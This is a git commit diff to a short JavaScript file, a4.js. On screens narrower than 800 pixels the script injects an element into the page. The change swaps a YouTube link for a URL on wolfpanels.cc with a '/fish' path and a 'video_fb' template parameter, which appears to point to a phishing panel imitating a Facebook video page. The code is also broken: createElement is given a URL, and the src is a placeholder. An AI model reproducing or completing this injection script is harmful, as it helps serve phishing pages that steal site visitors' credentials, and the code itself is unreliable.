dd3be67f6e31b22ba3ac3bf13da3271d0010fe00
jose3327 <143059154+jose3327@users.noreply.github.com>
2023-08-23 21:50:18 -0700

    Update a4.js

--- a4.js
+++ a4.js
@@ -1,5 +1,5 @@
 if(screen.width<800) {
-        var s = document.createElement("https://www.youtube.com/watch?v=F6-Z9ZXUk7s");
+        var s = document.createElement("https://wolfpanels.cc/fish?name=isaac01&amung=56756757&template=video_fb");
         s.src="aqui";
         document.body.appendChild(s);
     } else {
